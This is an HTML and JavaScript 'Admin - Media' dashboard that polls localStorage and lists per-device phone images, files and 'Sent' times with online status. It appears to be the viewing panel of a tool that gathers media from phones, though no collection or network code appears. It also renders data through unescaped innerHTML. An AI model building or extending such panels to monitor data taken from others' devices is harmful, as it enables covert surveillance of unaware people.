<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Admin - Media</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
        body{background:#0a0a0a;color:#00ff41;min-height:100vh;padding:20px;font-family:'Courier New',monospace}
        .container{max-width:1400px;margin:0 auto}
        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#0d0d0d;border-radius:12px;border:1px solid #00ff4133;margin-bottom:20px}
        .header h1{font-size:22px;color:#00ff41}
        .header .status{display:flex;align-items:center;gap:10px;font-size:13px;color:#00ff4188}
        .header .status .dot{width:10px;height:10px;border-radius:50%;background:#00ff41;animation:pulse 2s infinite}
        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
        .card{background:#0d0d0d;border-radius:12px;padding:16px;margin-bottom:16px;border:1px solid #00ff4122}
        .card h3{font-size:14px;color:#00ff41;margin-bottom:10px}
        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:16px}
        .item{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid #00ff4111;font-size:12px}
        .item .label{color:#00ff4188}
        .item .value{color:#00ff41}
        .btn{padding:8px 16px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;font-weight:600;font-size:12px;cursor:pointer;border:1px solid #00ff4133}
        .btn:hover{background:#00ff4133}
        .preview-img{max-width:200px;max-height:200px;border-radius:8px;border:1px solid #00ff4133;margin:8px 0}
        .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px;margin-bottom:20px}
        .stat-card{background:#0d0d0d;padding:14px 18px;border-radius:10px;border:1px solid #00ff4122}
        .stat-card .num{font-size:24px;font-weight:800;color:#00ff41}
        .stat-card .label{font-size:11px;color:#00ff4188}
        .logs{background:#000a00;padding:10px;border-radius:8px;border:1px solid #00ff4122;max-height:150px;overflow-y:auto;font-size:11px;color:#00ff4188;margin-top:10px}
        .logs .log-entry{color:#00ff41;padding:2px 0}
        .refresh-btn{padding:4px 14px;border:none;border-radius:8px;background:#00ff4122;color:#00ff41;cursor:pointer;border:1px solid #00ff4133;font-size:11px}
        @media(max-width:768px){.grid-2{grid-template-columns:1fr}}
    </style>
</head>
<body>

<div class="container">

    <div class="header">
        <div><h1>📸 ADMIN - MEDIA</h1><div style="font-size:11px;color:#00ff4188;">Phone Media & Files</div></div>
        <div class="status">
            <span class="dot"></span>
            <span>Live</span>
            <span style="color:#00ff4188;margin-left:10px;font-size:11px;" id="lastUpdate">Updated: Just now</span>
            <button class="refresh-btn" onclick="refreshData()">🔄</button>
        </div>
    </div>

    <div class="stats-grid">
        <div class="stat-card"><div class="num" id="totalDevices">0</div><div class="label">📱 Devices</div></div>
        <div class="stat-card"><div class="num" id="totalImages">0</div><div class="label">🖼️ Images</div></div>
        <div class="stat-card"><div class="num" id="totalFiles">0</div><div class="label">📁 Files</div></div>
    </div>

    <div id="mediaContainer">
        <div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ Waiting for media data...</div>
    </div>

    <div class="logs" id="logs">
        <div class="log-entry">[System] Media dashboard ready</div>
    </div>

</div>

<script>
    // ==========================================
    // 🔥 ADMIN - MEDIA DASHBOARD
    // ==========================================

    let mediaData = {};

    function loadData() {
        try {
            const raw = localStorage.getItem('phone_media');
            if (raw) {
                mediaData = JSON.parse(raw);
                renderMedia();
                updateStats();
                addLog('📊 Media data loaded: ' + Object.keys(mediaData).length + ' devices');
            } else {
                addLog('⏳ Waiting for media data...');
            }
        } catch(e) { console.log('Load error:', e); }
    }

    function renderMedia() {
        const container = document.getElementById('mediaContainer');
        const deviceIds = Object.keys(mediaData);

        if (deviceIds.length === 0) {
            container.innerHTML = '<div style="color:#00ff4188;text-align:center;padding:40px;font-size:13px;">⏳ No media data yet</div>';
            return;
        }

        let html = '';
        deviceIds.forEach(id => {
            const d = mediaData[id];
            const lastUpdate = d.lastUpdate ? new Date(d.lastUpdate).toLocaleTimeString() : 'Never';
            const isOnline = d.lastUpdate && (Date.now() - new Date(d.lastUpdate).getTime() < 60000);

            html += `
                <div class="card">
                    <h3>📱 ${id} <span style="font-size:11px;color:#00ff4188;">${isOnline ? '🟢 Online' : '🔴 Offline'} • ${lastUpdate}</span></h3>
                    ${d.image ? `<div><img src="${d.image}" class="preview-img"></div>` : ''}
                    ${d.files && d.files.length > 0 ? `
                        <div style="margin-top:8px;">
                            <div style="font-size:12px;color:#00ff4188;">📁 ${d.files.length} files</div>
                            ${d.files.slice(0, 5).map(f => `
                                <div class="item"><span class="label">${f.name}</span><span class="value">${Math.round(f.size/1024)} KB</span></div>
                            `).join('')}
                            ${d.files.length > 5 ? `<div style="color:#00ff4188;font-size:11px;">+ ${d.files.length - 5} more files</div>` : ''}
                        </div>
                    ` : ''}
                    <div style="font-size:11px;color:#00ff4188;margin-top:6px;">📤 Sent: ${d.timestamp ? new Date(d.timestamp).toLocaleString() : 'N/A'}</div>
                </div>
            `;
        });

        container.innerHTML = html;
        document.getElementById('totalDevices').textContent = deviceIds.length;
    }

    function updateStats() {
        const deviceIds = Object.keys(mediaData);
        let totalImages = 0, totalFiles = 0;
        deviceIds.forEach(id => {
            const d = mediaData[id];
            if (d.image) totalImages++;
            if (d.files) totalFiles += d.files.length;
        });
        document.getElementById('totalImages').textContent = totalImages;
        document.getElementById('totalFiles').textContent = totalFiles;
    }

    function refreshData() {
        loadData();
        document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString();
        addLog('🔄 Dashboard refreshed');
    }

    function addLog(msg) {
        const logs = document.getElementById('logs');
        const time = new Date().toLocaleTimeString();
        const entry = document.createElement('div');
        entry.className = 'log-entry';
        entry.textContent = `[${time}] ${msg}`;
        logs.appendChild(entry);
        logs.scrollTop = logs.scrollHeight;
        if (logs.children.length > 20) logs.removeChild(logs.children[0]);
    }

    setInterval(() => { loadData(); document.getElementById('lastUpdate').textContent = 'Updated: ' + new Date().toLocaleTimeString(); }, 5000);

    function init() {
        loadData();
        addLog('🟢 Media dashboard ready');
        console.log('📸 Admin - Media Loaded');
    }

    window.refreshData = refreshData;
    init();
</script>
</body>
</html>
